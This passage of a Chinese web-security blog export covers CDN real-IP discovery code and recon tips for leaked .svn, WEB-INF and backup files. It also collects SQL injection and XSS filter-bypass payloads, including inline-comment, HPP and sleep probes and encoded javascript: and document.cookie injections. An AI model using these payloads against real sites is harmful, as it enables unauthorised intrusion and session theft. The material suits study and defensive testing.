ipList=[]</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> allIP:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ipList.append(each[<span class="number">0</span>])</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(ipList)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> ipList</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_if_ip_c_machines_has_actual_ip_of_domain</span><span class="params">(self,ip)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 检测ip的c段有没有domain的真实ip,如果有则返回真实ip,如果没有则返回0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在检测ip为%s的c段中有没有%s的真实ip"</span> % (ip,self.domain))</span></pre></td></tr><tr><td class="code"><pre><span class="line">        target_list=self.get_c_80_or_443_list(ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> each_ip <span class="keyword">in</span> target_list:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> <span class="literal">True</span> == self.check_if_ip_is_actual_ip_of_domain(each_ip):</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">return</span> each_ip</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_ip_from_mx_record</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 从mx记录中得到ip列表,尝试从mx记录中的c段中找真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"尝试从mx记录中找和%s顶级域名相同的mx主机"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">import</span> socket</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># domain.eg:www.baidu.com</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">from</span> exp10it <span class="keyword">import</span> get_root_domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">        root_domain = get_root_domain(self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">from</span> exp10it <span class="keyword">import</span> get_string_from_command</span></pre></td></tr><tr><td class="code"><pre><span class="line">        result = get_string_from_command(<span class="string">"dig %s +short mx"</span> % root_domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        sub_domains_list = re.findall(<span class="string">r"\d&#123;1,&#125; (.*\.%s)\."</span> % root_domain.replace(<span class="string">"."</span>, <span class="string">"\."</span>), result)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        ip_list = []</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> sub_domains_list:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print(each)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ip = socket.gethostbyname_ex(each)[<span class="number">2</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> ip[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> ip_list:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                ip_list.append(ip[<span class="number">0</span>])</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> ip_list</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_if_mx_c_machines_has_actual_ip_of_domain</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 检测domain的mx记录所在ip[或ip列表]的c段中有没有domain的真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 有则返回真实ip,没有则返回0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"尝试从mx记录的c段中查找是否存在%s的真实ip"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        ip_list = self.get_ip_from_mx_record()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ip_list != []:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">for</span> each_ip <span class="keyword">in</span> ip_list:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                result = self.check_if_ip_c_machines_has_actual_ip_of_domain(each_ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">if</span> result != <span class="number">0</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="keyword">return</span> result</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    <span class="keyword">continue</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_ip_value_from_online_cloudflare_interface</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 从在线的cloudflare查询真实ip接口处查询真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 如果查询到真实ip则返回ip值,如果没有查询到则返回0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"现在从在线cloudflare类型cdn查询真实ip接口尝试获取真实ip"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        url = <span class="string">"http://www.crimeflare.com/cgi-bin/cfsearch.cgi"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        post_data = <span class="string">'cfS=%s'</span> % self.domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">        content = post_request(url, post_data)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        findIp = re.search(<span class="string">r"((\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;)"</span>, content)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> findIp:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> findIp.group(<span class="number">1</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_actual_ip_from_domain</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 尝试获得domain背后的真实ip,前提是domain有cdn</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 如果找到了则返回ip,如果没有找到返回0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        CLIOutput().good_print(<span class="string">"进入获取真实ip函数,认为每个domain都是有cdn的情况来处理"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">import</span> socket</span></pre></td></tr><tr><td class="code"><pre><span class="line">        has_cdn_value = self.domain_has_cdn()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> has_cdn_value[<span class="string">'has_cdn'</span>] == <span class="number">1</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"检测到domain:%s的A记录不止一个,认为它有cdn"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">pass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CLIOutput().good_print(<span class="string">"Attention...!!! Domain doesn't have cdn,I will return the only one ip"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            true_ip = socket.gethostbyname_ex(self.domain)[<span class="number">2</span>][<span class="number">0</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> true_ip</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 下面尝试通过cloudflare在线查询真实ip接口获取真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> has_cdn_value[<span class="string">'is_cloud_flare'</span>] == <span class="number">1</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ip_value = self.get_ip_value_from_online_cloudflare_interface()</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> ip_value != <span class="number">0</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">return</span> ip_value</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">pass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 下面尝试通过可能存在的phpinfo页面获得真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        ip_from_phpinfo = self.get_domain_actual_ip_from_phpinfo()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> ip_from_phpinfo == <span class="number">0</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">pass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> ip_from_phpinfo</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment"># 下面通过mx记录来尝试获得真实ip</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        result = self.check_if_mx_c_machines_has_actual_ip_of_domain()</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">pass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">return</span> result</span></pre></td></tr><tr><td class="code"><pre><span class="line">        print(<span class="string">"很遗憾,在下认为%s有cdn,但是目前在下的能力没能获取它的真实ip,当前函数将返回0"</span> % self.domain)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">import</span> sys</span></pre></td></tr><tr><td class="code"><pre><span class="line">    domain=sys.argv[<span class="number">1</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Xcdn(domain)</span></pre></td></tr></table></figure>
<h5 id="8、服务器ssh配置信息"><a href="#8、服务器ssh配置信息" class="headerlink" title="8、服务器ssh配置信息"></a>8、服务器ssh配置信息</h5><p>丢工具：<a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a></p>
<h5 id="9、敏感文件爆破"><a href="#9、敏感文件爆破" class="headerlink" title="9、敏感文件爆破"></a>9、敏感文件爆破</h5><ul>
<li><code>svn</code>源代码泄露使用<code>svn</code>版本控制系统时，错误操作将<code>.svn</code>文件存放，那么久可以看他<code>SVN</code>服务器账号密码等信息</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;.svn&#x2F;entries</span></pre></td></tr></table></figure>

<h5 id="10、根据目标系统情况"><a href="#10、根据目标系统情况" class="headerlink" title="10、根据目标系统情况"></a>10、根据目标系统情况</h5><p>根据目标系统情况是因为看他对应的系统是什么对应有什么漏洞，下面这个是<code>tomcat</code>的<code>session</code>泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample&#x2F;examples&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;examples&#x2F;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/c4nub4ydmq1402ccx0sav3x9/image_1dbvfielukp81f701hcd1qnq12e41j.png" alt="image_1dbvfielukp81f701hcd1qnq12e41j.png-57.6kB"></p>
<h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><ul>
<li><code>WEB-INF/web.xml</code>泄露</li>
</ul>
<p><code>WEB-INF</code>是<code>Java</code>的<code>WEB</code>应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<code>web.xml</code>文件对要访问的文件进行相应映射才能访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;config&#x2F;jdbc.properties</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;database.properties</span></pre></td></tr></table></figure>

<ul>
<li><code>bzr</code>泄露</li>
</ul>
<p>通过它我们可以看项目历史</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;.bzr&#x2F;</span></pre></td></tr></table></figure>

<ul>
<li>网站源代码泄露</li>
</ul>
<p>不多介绍，可能管理员觉得网站不安全，需要我们审计一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">www.tar.gz</span></pre></td></tr><tr><td class="code"><pre><span class="line">www.rar</span></pre></td></tr><tr><td class="code"><pre><span class="line">web.zip</span></pre></td></tr><tr><td class="code"><pre><span class="line">web.rar</span></pre></td></tr><tr><td class="code"><pre><span class="line">...</span></pre></td></tr></table></figure>

<p>这些有很多，，不一一详细，后面我会将这些全部集合在一个字典里，然后我们可以放入目录遍历的工具里批量扫~</p>
<h3 id="利用shodan、fofa等收集信息"><a href="#利用shodan、fofa等收集信息" class="headerlink" title="利用shodan、fofa等收集信息"></a>利用shodan、fofa等收集信息</h3><p>查找标题是携程并且语言是国语的站点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.shodan.io&#x2F;search?query&#x3D;http.title:&quot;携程&quot; country:&quot;CN&quot;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/6c72ksiz5fz1js4zomzvy6q3/image_1dbvfuq8rvjho6e3qd1etn1va420.png" alt="image_1dbvfuq8rvjho6e3qd1etn1va420.png-338.8kB"></p>
<p>我们可以将其收藏为文件夹，方便下次打开，然后记录时间，看看有没有新上线的（这里已经有监控的功能，各位师傅可以去看看米斯特大佬写的<code>shodan</code>监控文章，很有趣很实用）</p>
<p><code>shodan</code>、<code>fofa</code>不多介绍了，有对应的手册，见的肯定比我好</p>
<h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>思路扩展就是在<code>a</code>功能点中找出<code>b</code>功能点，以此类推</p>
<p>比如一些后台登录是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;admin-login</span></pre></td></tr></table></figure>

<p>我们是不是可以尝试吧<code>login</code>改成<code>register</code>来注册</p>
<p>再比如获取用户手机号的接口（这里不存在越权）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;user&#x2F;GetPhone&#x2F;?id&#x3D;1</span></pre></td></tr></table></figure>

<p>然后我们把<code>GetPhone</code>改成<code>GetPasswd</code>或者<code>GetPwd</code>或者<code>GetPassword</code>然后<code>id</code>就可能可以越权，或者这里可以<code>json</code>劫持或者<code>origin</code>劫持等，我们可以诱导用户点开来劫持账号密码</p>
<p>或者还是看源代码，然后搜索<code>hidden</code>（滑稽），我们可能可能会找到敏感操作的按钮，然后管理员也知道敏感，将其”隐藏”了，我们可以根据这个来搜索然后访问他，嘿嘿嘿（之前对一个小站点进行挖掘的时候我<code>hidden</code>找居然找到了不可描述的目录下面放着不可描述的电影，当时我的心情是非常拒绝的，经过几小时的思考我迅速的将那个目录关闭了，毕竟我是祖国的花朵）</p>
<p>这里有很多是<code>adrian</code>师傅与我分享的，然后暂时只写那么多吧（其实还有几个，怕触犯到权什么的就是他给你学了但不给我写的那种，很麻烦所以就以后有机会再写吧），如果遇到了更多我会补充</p>
<blockquote>
<p>来源于网络，回馈于网络</p>
</blockquote>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入绕过过滤总结</title>
    <url>/2019/12/18/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="MSSQL数据库特性"><a href="#MSSQL数据库特性" class="headerlink" title="MSSQL数据库特性"></a>MSSQL数据库特性</h2><ul>
<li>注释绕过：<ul>
<li><code>MSSQL</code>也可以使用<code>/**/</code>注释</li>
</ul>
</li>
<li>浮点数：<ul>
<li><code>select * from user where id=1.1union select 1,&#39;2&#39;,db_name() from user</code></li>
</ul>
</li>
<li><code>1EO</code>形式<ul>
<li><code>select * from user where id=1e0union select 1,&#39;2&#39;,db_name() from user</code></li>
</ul>
</li>
</ul>
<p>如执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1.</span>eunion <span class="keyword">select</span> xxxxxxx</span></pre></td></tr></table></figure>
<p>等同于</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> xxxxxxx</span></pre></td></tr></table></figure>

<p>但是这样可以绕过对<code>union select</code>的防御</p>
<h3 id="HPP特性"><a href="#HPP特性" class="headerlink" title="HPP特性"></a><code>HPP</code>特性</h3><p><code>ASPX+IIS</code>搭配的时候同时提交参数<code>id</code>，会接收所有的参数，通过逗号分割，比如在<code>cookie、post、get</code>里都传入<code>id=1</code>，那么最终的结果会是<code>1,1,1</code></p>
<p>再比如这个<code>url:http://www.a.com/index.php?id=1</code>存在<code>sql</code>注入，那么可与这样子</p>
<p><strong><code>get</code>请求中传入如下参数</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://www.a.com/index.php?id=1.eunion<span class="comment">/**/</span><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">name</span><span class="comment">/*</span></span></pre></td></tr></table></figure>

<p><strong>然后在<code>post</code>请求中传入如下参数</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">id=*/from xxxxxxx</span></pre></td></tr></table></figure>

<p>最终的输出结果就会变成这个样子</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="number">1.</span>eunion<span class="comment">/**/</span><span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="keyword">name</span><span class="comment">/*,*/</span><span class="keyword">from</span> xxxxxxx</span></pre></td></tr></table></figure>

<h2 id="MYSQL特性"><a href="#MYSQL特性" class="headerlink" title="MYSQL特性"></a>MYSQL特性</h2><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">内联注释：<span class="comment">/*!12345union*/</span><span class="keyword">select</span></span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/693xs0jeiif90en5l30jnzm6/1.png" alt="1.png-8kB"></p>
<p>如下方法可以快速的检测某处是否存在<code>sql</code>注入漏洞</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?id=1<span class="comment">/*!12345union*/</span><span class="keyword">select</span><span class="comment">/*!union12345sleep(5)*/</span>;</span></pre></td></tr></table></figure>

<h3 id="x-xxxx"><a href="#x-xxxx" class="headerlink" title="{x xxxx}"></a><code>{x xxxx}</code></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> &#123;x <span class="keyword">user</span>&#125;</span></pre></td></tr></table></figure>

<p>结果和这样一样</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span></span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/nuoptfjsz071utup5dp5nhfe/1.png" alt="1.png-8.9kB"></p>
<h3 id="E0"><a href="#E0" class="headerlink" title="E0"></a><code>E0</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E0在mysql里是效果等于空格</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/tnz7xiw06zro2d1vm34m66pt/1.png" alt="1.png-18.6kB"></p>
<h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p><img src="http://static.zybuluo.com/1kbfree/oxyz6iqpo51n1bmvxf6pwfpv/1.png" alt="1.png-16kB"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">.1union <span class="keyword">select</span> * <span class="keyword">from</span> xxxxx</span></pre></td></tr></table></figure>

<p>然后就会变成</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxxx <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1.1</span><span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> xxxxx</span></pre></td></tr></table></figure>

<p>这样子的话<code>id</code>就是不存在然后就会执行后面的<code>SQL</code>语句</p>
<h3 id="一些POC"><a href="#一些POC" class="headerlink" title="一些POC"></a>一些<code>POC</code></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1、<span class="comment">/*!12345select*/</span><span class="comment">/**/</span>from</span></pre></td></tr><tr><td class="code"><pre><span class="line">2、<span class="comment">/*!50001select*/</span>from</span></pre></td></tr><tr><td class="code"><pre><span class="line">3、<span class="keyword">Select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span><span class="keyword">from</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="number">4</span>、<span class="comment">/*!/*!select*/</span>column_name<span class="comment">/*!/*!from*/</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="number">5</span>、空格用<span class="comment">/*!*/</span>代替</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="number">6</span>、%<span class="number">53</span>elect<span class="comment">/*!1,2,schema_name%0aFROM</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">7、Get+Post，编码，超长内容等等。</span></span></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>xss绕过过滤总结</title>
    <url>/2019/12/18/xss%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<blockquote>
<p><code>xss</code>漏洞不多介绍，烂大街的~ 这里就讲这么绕过一些过滤</p>
</blockquote>
<h2 id="验证了on事件"><a href="#验证了on事件" class="headerlink" title="验证了on事件="></a>验证了<code>on事件=</code></h2><p>比如验证的是如下符号存在就会拦截</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onerror&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onclick&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onload&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onxxxxx&#x3D;</span></pre></td></tr></table></figure>

<p>那么我们可以这样子绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onerror+&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onerror%0a&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onerror%0d&#x3D;</span></pre></td></tr><tr><td class="code"><pre><span class="line">onerror%09&#x3D;</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/b9ytywudi79iwmi34my0gnig/image.png" alt="image.png-25.9kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/mvstekm3kj9524ecirr0adie/image.png" alt="image.png-26.2kB"></p>
<h2 id="将javascript-alert变成了javascr-ipt-alert"><a href="#将javascript-alert变成了javascr-ipt-alert" class="headerlink" title="将javascript:alert变成了javascr_ipt:alert"></a>将<code>javascript:alert</code>变成了<code>javascr_ipt:alert</code></h2><p>比如如下链接就是这样子过滤的，那么我们可以将其<code>ascii</code>编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.xss.tv&#x2F;level8.php?keyword&#x3D;%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B&amp;submit&#x3D;添加友情链接</span></pre></td></tr></table></figure>

<p>还可以用<code>%09</code>绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascr%09ipt:alert(1)</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/m4qsr4kbvg7sazkrum1mcnnc/1.png" alt="1.png-21.4kB"></p>
<p>还可以<code>%0a、%0d</code>绕过</p>
<h2 id="过滤了-lt-script-gt"><a href="#过滤了-lt-script-gt" class="headerlink" title="过滤了&lt;script&gt;"></a>过滤了<code>&lt;script&gt;</code></h2><ol>
<li>大小写绕过（<code>&lt;SCriPt&gt;</code>）</li>
<li>双写绕过（<code>&lt;scr&lt;script&gt;ipt&gt;</code>，他会把中间的<code>&lt;script&gt;</code>过滤掉，然后最终变成<code>&lt;script&gt;</code>）</li>
</ol>
<h2 id="打cookie绕过方法"><a href="#打cookie绕过方法" class="headerlink" title="打cookie绕过方法"></a>打<code>cookie</code>绕过方法</h2><p>很多站<code>waf</code>没限制弹窗，但是限制获取<code>cookie</code>限制原生代码写的远程加载<code>js</code>文件，那么我们可以利用框架</p>
<p>比如<code>www.a.com</code>站有<code>jquery</code>框架，那么我们可以这样子来引入<code>JS</code>文件来打<code>cookie</code>，案例如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/wniomrd6moez7xmo23jljmsq/1.png" alt="1.png-176.5kB"></p>
<blockquote>
<p><code>jquery</code>中可以用<code>$.getScript()</code>函数来引入<code>js</code>文件</p>
</blockquote>
<h2 id="空格代替符"><a href="#空格代替符" class="headerlink" title="空格代替符"></a>空格代替符</h2><p><code>%0a、%0d、%09</code>在<code>url</code>解码后都会变为空格，所以我们可以将其加入在<code>js</code>代码中，就可以达到扰乱一些<code>waf</code>规则</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">%<span class="number">09</span>alert%<span class="number">09</span>(<span class="number">1</span>);<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>%0dalert%0d(1);</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>%0aalert%0a(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>%<span class="number">0</span>a.%<span class="number">09</span>cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(%0ddocument%0a.%09cookie);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/1kbfree/37cqkwzfqoiyg64ionn4m3ts/1.png" alt="1.png-20.3kB"></p>
